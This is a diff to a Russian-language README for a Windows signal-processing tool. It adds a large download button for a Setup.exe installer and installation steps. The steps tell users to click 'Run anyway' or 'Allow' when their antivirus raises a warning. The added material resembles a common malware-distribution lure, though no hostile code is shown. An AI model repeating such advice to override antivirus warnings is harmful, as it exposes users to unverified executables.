@@ -2,11 +2,29 @@
 
 **Инженерный комплекс для цифровой обработки сигналов и систем связи**
 
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/nsolodov/SpectrumSignalForge)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue)](https://github.com/nsolodov/SpectrumSignalForge)
-[![Download](https://img.shields.io/badge/download-Setup-green.svg)](https://github.com/nsolodov/SpectrumSignalForge/releases/download/v1.0.0/SpectrumSignalForge_Setup.exe)
+## Скачать
+
+<div align="center">
+
+### [⬇️ Скачать SpectrumSignalForge_Setup.exe](https://github.com/nsolodov/SpectrumSignalForge/releases/download/v1.0.0/SpectrumSignalForge_Setup.exe)
+
+**Версия 1.0.0** | **115 МБ** | **Windows 10/11**
+
+[![Скачать установщик](https://img.shields.io/badge/⬇️_Скачать_установщик-0078D6?style=for-the-badge&logo=windows&logoColor=white&labelColor=005a9e)](https://github.com/nsolodov/SpectrumSignalForge/releases/download/v1.0.0/SpectrumSignalForge_Setup.exe)
+
+</div>
 
 ---
+
+## Как установить
+
+1. Скачайте файл `SpectrumSignalForge_Setup.exe`
+2. Запустите его двойным кликом
+3. Следуйте инструкциям установщика
+4. Ярлык появится на рабочем столе
+
+> **Примечание:** При первом запуске антивирус может запросить разрешение — нажмите "Выполнить в любом случае" или "Разрешить".
+
 
 ## О проекте
 
